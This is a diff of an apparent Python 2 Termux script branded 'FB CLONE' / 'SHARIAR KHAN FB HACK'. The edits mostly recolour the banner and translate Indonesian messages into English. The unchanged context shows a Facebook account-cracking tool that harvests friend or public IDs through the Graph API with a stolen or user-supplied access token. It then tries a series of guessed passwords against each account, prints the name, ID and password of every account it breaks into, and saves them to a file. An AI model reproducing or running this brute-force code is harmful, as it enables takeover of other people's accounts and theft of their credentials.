@@ -59,19 +59,20 @@ def jalan(z):
 		
 #########LOGO#########
 logo = """
-\033[1;94m ═════════════════════════════   \033[1;91m
+\033[1;95m ═════════════════════════════   \033[1;91m
 \033[1;92m FB CLONE WITH TERMUX **SULTAN**!   \033[1;91m
-\033[1;94m ═════════════════════════════   \033[1;91m
+\033[1;95m ═════════════════════════════   \033[1;91m
 \033[1;92m ((SULTAN SHARIAR)) FB CLONE WITH TERMUX  \033[1;91m                                                                                                                                                                                     
-\033[1;94m ═════════════════════════════   
-\033[1;92m login any new facebook acoount!!     \033[1;91m
-\033[1;94m ═════════════════════════════   \033[1;91m
-\033[1;96mAuthor   : Shazada shariar
-\033[1;96mTelegram  : Termux comands
-\033[1;94m ______________________________________________
-\033[1;92m ==============》》SULTAN SHARIAR《《=============
-\033[1;94m ************************************************
-\033[1;92m _________________________________________________
+\033[1;95m ═════════════════════════════   
+\033[1;93m login any new facebook acoount!!     \033[1;91m
+\033[1;95m ═════════════════════════════   \033[1;91m
+\033[1;34mAuthor   : Shazada shariar
+\033[1;98mTelegram  : Termux comands
+\033[1;95m ______________________________________________
+\033[1;1m=================》》SULTAN《《=================
+\033[1;33m▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎▪︎
+\033[1;90m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
+\033[1;34m••••••••••••••••••••••••••••••••••••••••••••••••
 """
 
 def tik():
@@ -135,7 +136,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print"\033[1;97m[\033[1;96m🤡\033[1;97m] LOGIN AKUN FACEBOOK ANDA \033[1;97m[\033[1;96m🤡\033[1;97m]"
+		print"\033[1;97m[\033[1;96m🇦🇫\033[1;97m] LOGIN Facebook Acoount \033[1;97m[\033[1;96m🇦🇫\033[1;97m]"
 		id = raw_input('[\033[1;95m+\033[1;97m] ID / Email =\033[1;92m ')
 		pwd = raw_input('\033[1;97m[\033[1;95m?\033[1;97m] Password =\033[1;92m ')
 		tik()
@@ -164,7 +165,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
+				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Ok login Saved✔'
 				os.system('xdg-open https://m.facebook.com/user.keramat.90')
 				bot_komen()
 			except requests.exceptions.ConnectionError:
@@ -193,7 +194,7 @@ def tokenz():
 		zedd = open("login.txt", 'w')
 		zedd.write(toket)
 		zedd.close()
-		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Berhasil'
+		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Ok login Saved✔'
 		os.system('xdg-open https://www.youtube.com/channel/UCYb2TtQ2cMVQOagojCLAx3Q ')
 		bot_komen()
 	except KeyError:
@@ -260,12 +261,12 @@ def menu():
 	print logo
 	print "\033[1;31;1m=========================================="
 	print "\033[37;1m=========================================="
-	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Nama Akun\033[1;91m     =>\033[1;93m "+nama
+	print "\033[1;97m[\033[1;34m✓\033[1;97m]\033[1;34m Name FB\033[1;91m     =>\033[1;93m "+nama
 	print "\033[1;97m[\033[1;34m•\033[1;97m]\033[1;34m UID\033[1;91m           =>\033[1;93m "+id
 	print "\033[1;97m[\033[1;34m+\033[1;97m]\033[1;34m Tanggal Lahir\033[1;91m =>\033[1;93m "+ a['birthday']
 	print "\033[37;96m╔═════════════════════════╗"
 	print "\033[37;96m║[\033[1;31;1m01\033[37;96m]\033[1;31;1m->\033[37;1mCrack ID Indonesia \033[37;96m║"
-	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mKeluar             \033[37;96m║"
+	print "\033[37;96m║[\033[1;31;1m02\033[37;96m]\033[1;31;1m->\033[37;1mExit               \033[37;96m║"
 	print "\033[37;96m╚═════════════════════════╝"
 	pilih()
 	
@@ -300,9 +301,9 @@ def indo():
 	os.system('clear')
 	print logo
 	print "\033[37;96m╔══════════════════════════════╗"
-	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari Daftar Teman \033[37;96m║"
-	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack Dari ID Publik    \033[37;96m║"
-	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari File         \033[37;96m║"
+	print "\033[37;96m║\033[1;34m[01]\033[1;31;1m->\033[37;1mCrack Dari FB Teman \033[37;96m║"
+	print "\033[37;96m║\033[1;34m[02]\033[1;31;1m->\033[37;1mCrack FB ID Publik    \033[37;96m║"
+	print "\033[37;96m║\033[1;34m[03]\033[1;31;1m->\033[37;1mCrack Dari Fb File         \033[37;96m║"
 	print "\033[37;96m║\033[1;34m[00]\033[1;31;1m->\033[37;1mKembali                 \033[37;96m║"
 	print "\033[37;96m╚══════════════════════════════╝"
 	pilih_indo()
@@ -326,7 +327,7 @@ def pilih_indo():
 		print logo
 		print "\033[1;31;1m=========================================="
 		print "\033[37;1m=========================================="
-	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID publik/teman : ")
+	        idt = raw_input("\033[1;97m{\033[1;34m✔\033[1;97m} ID public/FB : ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -367,7 +368,7 @@ def pilih_indo():
 	print('\033[1;97m{\033[1;93m➹\033[1;97m} Stop CTRL+Z')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;97m{\033[1;93m➹\033[1;97m} SULTAN SHARIAR... "+o),;sys.stdout.flush();time.sleep(1)
 
 	print "\n\033[1;31;1m=========================================="
         print "\n\033[1;96mSHARIAR KHAN FB HACK"
@@ -391,7 +392,7 @@ def pilih_indo():
 			if 'access_token' in w:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 				z = json.loads(x.text)
-				print '\x1c\33[1;33m[✔] \x1c\33[1;33mBerhasil'
+				print '\x1c\33[1;33m[✔] \x1c\33[1;33mOk login Saved✔'
 				print '\x1c\33[1;33m[✴] \x1c\33[1;33mName \x1c\33[1;33m    : \x1c\33[1;33m' + c['name']
 				print '\x1c\33[1;33m[➹] \x1c\33[1;33mID \x1c\33[1;33m      : \x1c\33[1;33m' + user
 				print '\x1c\33[1;33m[➹] \x1c\33[1;33mPassword \x1c\33[1;33m: \x1c\33[1;33m' + pass1 + '\n'
@@ -415,7 +416,7 @@ def pilih_indo():
 					if 'access_token' in w:
 						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 						z = json.loads(x.text)
-						print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+						print '\x1c\033[1;94m[✔] \x1c\033[1;92mOK login Save✔'
 						print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 						print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
 						print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'
@@ -427,7 +428,7 @@ def pilih_indo():
 							print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
 							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass2 + '\n'
-							print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+							print '\x1c\033[1;97m[➹] \x1c\033[1;33mSULTAN \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
 							cek = open("out/super_cp.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
@@ -439,7 +440,7 @@ def pilih_indo():
 							if 'access_token' in w:
 								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 								z = json.loads(x.text)
-								print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+								print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 								print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 								print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
 								print '\x1c\033[1;94m[➹] \x1c\033[1;91mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'
@@ -463,7 +464,7 @@ def pilih_indo():
 									if 'access_token' in w:
 										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 										z = json.loads(x.text)
-										print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+										print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 										print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 										print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
 										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass4 + '\n'
@@ -487,7 +488,7 @@ def pilih_indo():
 											if 'access_token' in w:
 												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 												z = json.loads(x.text)
-												print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+												print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 												print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 												print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
 												print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass5 + '\n'
@@ -511,7 +512,7 @@ def pilih_indo():
 													if 'access_token' in w:
 														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 														z = json.loads(x.text)
-														print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+														print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 														print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 														print '\x1c\033[1;94m[➹] \x1c\033[1;91mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
 														print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass6 + '\n'
@@ -535,7 +536,7 @@ def pilih_indo():
 															if 'access_token' in w:
 																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																z = json.loads(x.text)
-																print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+																print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 																print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 																print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 																print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass7 + '\n'
@@ -559,7 +560,7 @@ def pilih_indo():
 																	if 'access_token' in w:
 																		x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																		z = json.loads(x.text)
-																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+																		print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 																		print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 																		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
@@ -583,7 +584,7 @@ def pilih_indo():
 																				if 'access_token' in w:
 																					x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																					z = json.loads(x.text)
-																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+																					print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 																					print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 																					print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass9 + '\n'
@@ -607,7 +608,7 @@ def pilih_indo():
 																						if 'access_token' in w:
 																							x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																							z = json.loads(x.text)
-																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+																							print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 																							print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 																							print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
@@ -631,7 +632,7 @@ def pilih_indo():
 																								if 'access_token' in w:
 																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																									z = json.loads(x.text)
-																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
+																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mOk login Saved✔'
 																									print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
 																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
 																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
